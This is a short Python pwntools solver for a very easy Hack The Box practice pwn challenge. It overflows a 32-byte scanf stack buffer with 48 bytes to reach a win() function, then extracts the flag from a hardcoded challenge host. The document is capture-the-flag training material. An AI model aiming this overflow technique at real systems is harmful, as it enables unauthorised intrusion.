#!/usr/bin/env python3
"""
Getting Started (HTB Try Out, very easy pwn) — solver.

main() calls scanf("%s", buf) into a 32-byte stack buffer at rbp-0x30.
Stack layout: [32-byte buffer][8-byte alignment][8-byte target 0xdeadbeef]...
Overwriting the 0xdeadbeef value at offset 40 makes main jump to win(),
which opens ./flag.txt and prints it byte by byte.
"""

from pwn import *

HOST = "154.57.164.71"
PORT = 31025

context.log_level = "info"
r = remote(HOST, PORT)

# consume banner (up to the "Fill the 32-byte buffer..." box and scanf wait)
try:
    banner = r.recv(timeout=3)
    log.info(f"banner ({len(banner)} bytes)")
except Exception:
    pass

# 32 (buffer) + 8 (alignment) + 8 (deadbeef target) = 48 bytes overwrites the target
payload = b"A" * 48
r.sendline(payload)

out = r.recvall(timeout=5)
with open("solve/evidence/out.txt", "wb") as f:
    f.write(out)
flag = re.search(rb"HTB\{[^}]+\}", out)
if flag:
    print("FLAG:", flag.group(0).decode())
    with open("final_flag.txt", "w") as f:
        f.write(flag.group(0).decode() + "\n")
else:
    print("no flag found; output saved to solve/evidence/out.txt")
r.close()
